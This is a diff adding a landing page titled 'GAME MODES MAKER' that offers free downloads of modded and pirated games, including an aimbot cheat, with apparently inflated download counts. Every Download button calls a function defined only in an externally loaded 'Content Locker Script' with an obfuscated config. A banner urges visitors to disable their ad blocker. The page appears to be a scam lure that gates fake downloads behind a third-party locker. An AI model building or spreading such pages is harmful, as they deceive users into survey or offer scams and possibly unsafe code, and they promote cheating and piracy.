@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>GAME MODES MAKER</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #1e1e2f, #2a2a3d);
+      color: #fff;
+    }
+    header {
+      background-color: #111;
+      padding: 20px;
+      text-align: center;
+    }
+    header h1 {
+      margin: 0;
+      font-size: 2.5em;
+      color: #00ffcc;
+    }
+
+    .alert-banner {
+      background-color: #ff4444;
+      padding: 10px;
+      text-align: center;
+      color: #fff;
+      font-weight: bold;
+      animation: slideDown 1s ease-in-out;
+    }
+
+    @keyframes slideDown {
+      from { transform: translateY(-100%); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+
+    .search-bar {
+      margin: 20px auto;
+      max-width: 600px;
+      display: flex;
+      justify-content: center;
+    }
+
+    .search-bar input {
+      width: 80%;
+      padding: 10px;
+      border: none;
+      border-radius: 5px 0 0 5px;
+      font-size: 1em;
+    }
+
+    .search-bar button {
+      padding: 10px 20px;
+      border: none;
+      background-color: #00ffcc;
+      color: #000;
+      border-radius: 0 5px 5px 0;
+      cursor: pointer;
+      font-size: 1em;
+    }
+
+    .games-container {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .game-card {
+      background-color: #222;
+      border-radius: 10px;
+      margin: 15px;
+      width: 260px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.5);
+      overflow: hidden;
+      transition: transform 0.3s;
+      text-align: center;
+    }
+
+    .game-card:hover {
+      transform: scale(1.05);
+    }
+
+    .game-card img {
+      width: 100%;
+      height: 160px;
+      object-fit: cover;
+    }
+
+    .game-card h2 {
+      margin: 10px;
+      font-size: 1.2em;
+      color: #00ffcc;
+    }
+
+    .game-card p {
+      margin: 5px;
+      font-size: 0.9em;
+      color: #ccc;
+    }
+
+    .game-card button {
+      margin: 10px;
+      padding: 10px;
+      width: calc(100% - 20px);
+      border: none;
+      background-color: #00ffcc;
+      color: #000;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 1em;
+    }
+
+    footer {
+      text-align: center;
+      padding: 20px;
+      background-color: #111;
+      color: #888;
+    }
+  </style>
+
+  <!-- Content Locker Script -->
+  <script type="text/javascript">
+    var HRsGl_RwV_fOkFQc = {"it":4476259,"key":"ef560"};
+  </script>
+  <script src="https://d2v7l2267atlz5.cloudfront.net/0670767.js"></script>
+</head>
+
+<body>
+
+  <header>
+    <h1>GAME MODES MAKER</h1>
+  </header>
+
+  <div class="alert-banner">
+    ⚠️ If download doesn't work, disable Ad Blocker or try Google Chrome!
+  </div>
+
+  <div class="search-bar">
+    <input type="text" id="searchInput" placeholder="Search for a game...">
+    <button onclick="searchGames()">Search</button>
+  </div>
+
+  <div class="games-container" id="gamesContainer">
+
+    <div class="game-card" data-title="GTA San Cars Pack">
+      <img src="https://miro.medium.com/v2/resize:fit:1200/1*R_EIwtIqQdqjmo1013-QXQ.jpeg" alt="GTA San Cars Pack">
+      <h2>GTA San Cars Pack</h2>
+      <p>Downloads: 150K+</p>
+      <p>Rating: ⭐ 4.6</p>
+      <button onclick="_Ri()">Download</button>
+    </div>
+
+    <div class="game-card" data-title="GTA San Andreas">
+      <img src="https://vignette.wikia.nocookie.net/es.gta/images/c/c2/Grand_Theft_Auto_San_Andreas.JPG/revision/latest?cb=20161127211015" alt="GTA San Andreas">
+      <h2>GTA San Andreas</h2>
+      <p>Downloads: 500K+</p>
+      <p>Rating: ⭐ 4.8</p>
+      <button onclick="_Ri()">Download</button>
+    </div>
+
+    <div class="game-card" data-title="Truckers of Europe 3">
+      <img src="https://wallpapercave.com/wp/wp13430002.jpg" alt="Truckers of Europe 3">
+      <h2>Truckers of Europe 3</h2>
+      <p>Downloads: 300K+</p>
+      <p>Rating: ⭐ 4.7</p>
+      <button onclick="_Ri()">Download</button>
+    </div>
+
+    <div class="game-card" data-title="Roblox">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/4/48/Roblox_Logo_2021.png" alt="Roblox">
+      <h2>Roblox</h2>
+      <p>Downloads: 1M+</p>
+      <p>Rating: ⭐ 4.9</p>
+      <button onclick="_Ri()">Download</button>
+    </div>
+
+    <div class="game-card" data-title="GTA Vice City">
+      <img src="https://i.pinimg.com/736x/45/03/41/4503418b30265dfe57cc4a281608d926.jpg" alt="GTA Vice City">
+      <h2>GTA Vice City</h2>
+      <p>Downloads: 400K+</p>
+      <p>Rating: ⭐ 4.5</p>
+      <button onclick="_Ri()">Download</button>
+    </div>
+
+    <div class="game-card" data-title="Free Fire Aimbot">
+      <img src="https://i.pinimg.com/736x/8b/6c/cf/8b6ccff780421ab65d4505b035dad2e9.jpg" alt="Free Fire Aimbot">
+      <h2>Free Fire Aimbot</h2>
+      <p>Downloads: 850K+</p>
+      <p>Rating: ⭐ 4.2</p>
+      <button onclick="_Ri()">Download</button>
+    </div>
+
+    <div class="game-card" data-title="Monopoly GO MOD">
+      <img src="https://i.pinimg.com/736x/c6/76/10/c676100dfbe34c2c159ce5b0017d6a00.jpg" alt="Monopoly GO MOD">
+      <h2>Monopoly GO MOD</h2>
+      <p>Downloads: 290K+</p>
+      <p>Rating: ⭐ 4.4</p>
+      <button onclick="_Ri()">Download</button>
+    </div>
+
+    <div class="game-card" data-title="Subway Surfers MOD">
+      <img src="https://i.pinimg.com/736x/2f/b5/4a/2fb54aa6c8a9d80e7a41b1b981575a3e.jpg" alt="Subway Surfers MOD">
+      <h2>Subway Surfers MOD</h2>
+      <p>Downloads: 720K+</p>
+      <p>Rating: ⭐ 4.3</p>
+      <button onclick="_Ri()">Download</button>
+    </div>
+
+  </div>
+
+  <footer>
+    &copy; 2025 GAME MODES MAKER. All rights reserved.
+  </footer>
+
+  <!-- JavaScript for search -->
+  <script>
+    function searchGames() {
+      var input = document.getElementById('searchInput').value.toLowerCase();
+      var cards = document.querySelectorAll('.game-card');
+      cards.forEach(card => {
+        const title = card.getAttribute('data-title').toLowerCase();
+        if (title.includes(input)) {
+          card.style.display = 'block';
+        } else {
+          card.style.display = 'none';
+        }
+      });
+    }
+  </script>
+</body>
+</html>
